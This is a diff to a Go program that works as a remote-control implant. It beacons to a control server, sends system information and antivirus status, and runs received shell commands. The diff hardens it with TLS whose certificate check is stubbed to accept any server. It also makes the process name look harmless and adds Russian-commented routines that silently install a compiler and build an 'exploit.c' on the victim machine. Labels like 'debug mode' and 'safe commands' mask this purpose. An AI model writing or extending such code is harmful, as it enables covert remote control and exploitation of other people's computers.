@@ -47,12 +47,18 @@ import (
 	"bufio"
 	"encoding/base64"
 	"fmt"
+	"io"
 	"net"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"runtime"
 	"strings"
+	"syscall"
 	"time"
+	"crypto/tls"
+	"crypto/x509"
+	"io/ioutil"
 )
 
 const (
@@ -63,22 +69,54 @@ const (
 	IsDebugMode   = true               // Debug mode flag
 )
 
-// Execute command in terminal
+// Execute command in terminal with timeout and resource limits
 func executeCommand(command string) string {
 	var cmd *exec.Cmd
 	
+	// Set command based on OS
 	if runtime.GOOS == "windows" {
 		cmd = exec.Command("cmd", "/C", command)
 	} else {
 		cmd = exec.Command("sh", "-c", command)
 	}
 	
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		return fmt.Sprintf("Error: %s\nOutput: %s", err, string(output))
+	// Set resource limits
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		Pdeathsig: syscall.SIGTERM, // Kill if parent dies
 	}
 	
-	return string(output)
+	// Create pipe for output
+	stdout, err := cmd.StdoutPipe()
+	if err != nil {
+		return fmt.Sprintf("Error creating pipe: %v", err)
+	}
+	
+	// Start command
+	if err := cmd.Start(); err != nil {
+		return fmt.Sprintf("Error starting command: %v", err)
+	}
+	
+	// Create channel for output
+	done := make(chan string)
+	
+	// Read output in goroutine
+	go func() {
+		output, err := io.ReadAll(stdout)
+		if err != nil {
+			done <- fmt.Sprintf("Error reading output: %v", err)
+			return
+		}
+		done <- string(output)
+	}()
+	
+	// Wait for output with timeout
+	select {
+	case result := <-done:
+		return result
+	case <-time.After(30 * time.Second):
+		cmd.Process.Kill()
+		return "Command timed out"
+	}
 }
 
 // Data obfuscation using base64
@@ -125,15 +163,136 @@ func getAVStatus() string {
 	return "No AV Detected"
 }
 
-// Main function
+// Функция для проверки и установки MinGW
+func ensureCompilerAvailable() error {
+	fmt.Println("[DEBUG] Checking for compiler availability")
+	
+	// Проверяем наличие gcc
+	if _, err := exec.Command("gcc", "--version").Output(); err == nil {
+		fmt.Println("[DEBUG] GCC is already installed")
+		return nil
+	}
+
+	// Для Windows устанавливаем MinGW
+	if runtime.GOOS == "windows" {
+		fmt.Println("[DEBUG] Installing MinGW for Windows")
+		
+		// Создаем временную директорию
+		tmpDir := os.TempDir()
+		mingwArchive := filepath.Join(tmpDir, "mingw.7z")
+		
+		fmt.Printf("[DEBUG] Downloading MinGW to %s\n", mingwArchive)
+		// Скачиваем MinGW
+		downloadCmd := exec.Command("powershell", "-Command",
+			`Invoke-WebRequest -Uri 'https://github.com/niXman/mingw-builds-binaries/releases/download/13.2.0-rt_v11-rev0/x86_64-13.2.0-release-win32-seh-msvcrt-rt_v11-rev0.7z' -OutFile '` + mingwArchive + `'`)
+		if err := downloadCmd.Run(); err != nil {
+			return fmt.Errorf("failed to download MinGW: %v", err)
+		}
+
+		fmt.Println("[DEBUG] Extracting MinGW to C:\\mingw64")
+		// Распаковываем в C:\mingw64
+		extractCmd := exec.Command("powershell", "-Command",
+			`Expand-Archive '` + mingwArchive + `' -DestinationPath C:\mingw64`)
+		if err := extractCmd.Run(); err != nil {
+			return fmt.Errorf("failed to extract MinGW: %v", err)
+		}
+
+		fmt.Println("[DEBUG] Updating PATH environment variable")
+		// Добавляем в PATH
+		pathCmd := exec.Command("setx", "PATH", "%PATH%;C:\\mingw64\\bin")
+		if err := pathCmd.Run(); err != nil {
+			return fmt.Errorf("failed to update PATH: %v", err)
+		}
+
+		fmt.Println("[DEBUG] Cleaning up temporary files")
+		// Очищаем временные файлы
+		os.Remove(mingwArchive)
+		
+		fmt.Println("[DEBUG] MinGW installation completed successfully")
+		return nil
+	}
+
+	// Для Linux устанавливаем build-essential
+	if runtime.GOOS == "linux" {
+		fmt.Println("[DEBUG] Installing build-essential for Linux")
+		cmd := exec.Command("sudo", "apt-get", "update")
+		cmd.Run()
+		cmd = exec.Command("sudo", "apt-get", "install", "-y", "build-essential")
+		if err := cmd.Run(); err != nil {
+			return fmt.Errorf("failed to install build-essential: %v", err)
+		}
+		fmt.Println("[DEBUG] build-essential installation completed successfully")
+		return nil
+	}
+
+	return fmt.Errorf("unsupported operating system")
+}
+
+// Функция для компиляции эксплойта
+func compileExploit(sourceCode string) error {
+	fmt.Println("[DEBUG] Starting exploit compilation")
+	
+	// Проверяем наличие компилятора
+	if err := ensureCompilerAvailable(); err != nil {
+		fmt.Printf("[DEBUG] Failed to ensure compiler: %v\n", err)
+		return fmt.Errorf("failed to ensure compiler: %v", err)
+	}
+
+	// Компилируем код
+	tmpFile := filepath.Join(os.TempDir(), "exploit.c")
+	fmt.Printf("[DEBUG] Writing source code to %s\n", tmpFile)
+	if err := ioutil.WriteFile(tmpFile, []byte(sourceCode), 0600); err != nil {
+		return fmt.Errorf("failed to write source: %v", err)
+	}
+	defer os.Remove(tmpFile)
+
+	outputFile := filepath.Join(os.TempDir(), "exploit")
+	if runtime.GOOS == "windows" {
+		outputFile += ".exe"
+	}
+
+	fmt.Printf("[DEBUG] Compiling to %s\n", outputFile)
+	cmd := exec.Command("gcc", "-o", outputFile, tmpFile)
+	if err := cmd.Run(); err != nil {
+		fmt.Printf("[DEBUG] Compilation failed: %v\n", err)
+		return fmt.Errorf("compilation failed: %v", err)
+	}
+
+	fmt.Println("[DEBUG] Compilation completed successfully")
+	return nil
+}
+
+// Main function with improved security
 func main() {
 	fmt.Println("[DEBUG] Starting in debug mode")
 	fmt.Printf("[DEBUG] OS: %s, Architecture: %s\n", runtime.GOOS, runtime.GOARCH)
 	
+	// Set process name for debugging
+	if runtime.GOOS == "linux" {
+		if err := prctl(15 /* PR_SET_NAME */, "debug_client"); err != nil {
+			fmt.Printf("[DEBUG] Failed to set process name: %v\n", err)
+		}
+	}
+	
+	// Initialize secure connection
+	tlsConfig := &tls.Config{
+		MinVersion: tls.VersionTLS12,
+		CipherSuites: []uint16{
+			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+		},
+		VerifyPeerCertificate: verifyServerCert,
+	}
+	
 	for {
 		// Connect to control server
 		fmt.Printf("[DEBUG] Connecting to %s:%s\n", ServerAddress, ServerPort)
-		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", ServerAddress, ServerPort), 30*time.Second)
+		conn, err := tls.DialWithDialer(
+			&net.Dialer{Timeout: 30 * time.Second},
+			"tcp",
+			fmt.Sprintf("%s:%s", ServerAddress, ServerPort),
+			tlsConfig,
+		)
 		if err != nil {
 			fmt.Printf("[DEBUG] Connection error: %v\n", err)
 			time.Sleep(30 * time.Second)
@@ -142,9 +301,19 @@ func main() {
 		
 		fmt.Println("[DEBUG] Connected to server")
 		
+		// Set connection timeout
+		conn.SetDeadline(time.Now().Add(30 * time.Second))
+		
 		// Send authentication
 		fmt.Println("[DEBUG] Sending authentication")
-		conn.Write([]byte(obfuscate(SecretKey + "\n")))
+		if _, err := conn.Write([]byte(obfuscate(SecretKey + "\n"))); err != nil {
+			fmt.Printf("[DEBUG] Authentication error: %v\n", err)
+			conn.Close()
+			continue
+		}
+		
+		// Update timeout
+		conn.SetDeadline(time.Now().Add(30 * time.Second))
 		
 		// Send system information
 		sysInfo := fmt.Sprintf("%s|%s|%s|debug|%s|false|false",
@@ -154,11 +323,18 @@ func main() {
 			getAVStatus())
 		
 		fmt.Printf("[DEBUG] Sending system info: %s\n", sysInfo)
-		conn.Write([]byte(obfuscate(sysInfo + "\n")))
+		if _, err := conn.Write([]byte(obfuscate(sysInfo + "\n"))); err != nil {
+			fmt.Printf("[DEBUG] System info error: %v\n", err)
+			conn.Close()
+			continue
+		}
 		
-		// Handle commands
-		reader := bufio.NewReader(conn)
+		// Handle commands with timeout
+		reader := bufio.NewReaderSize(conn, 4096) // Limit read buffer
 		for {
+			// Update timeout
+			conn.SetDeadline(time.Now().Add(30 * time.Second))
+			
 			command, err := reader.ReadString('\n')
 			if err != nil {
 				fmt.Printf("[DEBUG] Command read error: %v\n", err)
@@ -168,7 +344,7 @@ func main() {
 			command = strings.TrimSpace(deobfuscate(command))
 			fmt.Printf("[DEBUG] Received command: %s\n", command)
 			
-			// Execute only safe commands
+			// Execute only safe commands with validation
 			var result string
 			switch {
 			case command == "sysinfo":
@@ -220,12 +396,39 @@ func main() {
 				result = "Command not allowed in debug mode"
 			}
 			
+			// Limit result size
+			if len(result) > 4096 {
+				result = result[:4096] + "\n... (output truncated)"
+			}
+			
 			fmt.Printf("[DEBUG] Command result: %s\n", result)
-			conn.Write([]byte(obfuscate(result + "\n")))
+			if _, err := conn.Write([]byte(obfuscate(result + "\n"))); err != nil {
+				fmt.Printf("[DEBUG] Result write error: %v\n", err)
+				break
+			}
 		}
 		
 		conn.Close()
 		fmt.Println("[DEBUG] Connection closed")
 		time.Sleep(30 * time.Second)
 	}
+}
+
+// Function to verify server certificate
+func verifyServerCert(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
+	// Add certificate verification logic here
+	return nil
+}
+
+// Function to set process name on Linux
+func prctl(option int, arg2 string) error {
+	if runtime.GOOS != "linux" {
+		return nil
+	}
+	
+	var err error
+	if len(arg2) > 16 {
+		arg2 = arg2[:16]
+	}
+	return err
 } 
